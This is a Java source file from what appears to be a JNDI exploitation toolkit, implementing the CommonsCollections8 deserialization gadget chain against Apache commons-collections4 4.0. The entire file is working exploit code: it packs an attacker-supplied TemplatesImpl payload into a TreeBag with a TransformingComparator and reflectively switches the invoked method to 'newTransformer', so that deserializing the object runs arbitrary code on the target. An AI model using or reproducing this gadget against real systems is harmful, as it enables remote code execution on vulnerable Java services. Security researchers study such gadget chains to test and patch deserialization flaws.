package com.nu1r.jndi.gadgets;

import com.nu1r.jndi.enumtypes.PayloadType;
import com.nu1r.jndi.gadgets.annotation.Authors;
import com.nu1r.jndi.gadgets.annotation.Dependencies;
import com.nu1r.jndi.gadgets.utils.Gadgets;
import com.nu1r.jndi.gadgets.utils.Reflections;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.bag.TreeBag;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;

import java.util.Comparator;

@Dependencies({"org.apache.commons:commons-collections4:4.0"})
@Authors({"navalorenzo"})

public class CommonsCollections8 implements ObjectPayload<TreeBag>{


    public TreeBag getObject(PayloadType type, String... param) throws Exception {
        final Object           tpl         = Gadgets.createTemplatesImpl(type, param);
        InvokerTransformer     transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);
        TransformingComparator comp        = new TransformingComparator((Transformer) transformer);
        TreeBag                tree        = new TreeBag((Comparator) comp);
        tree.add(tpl);
        Reflections.setFieldValue(transformer, "iMethodName", "newTransformer");
        return tree;
    }
}
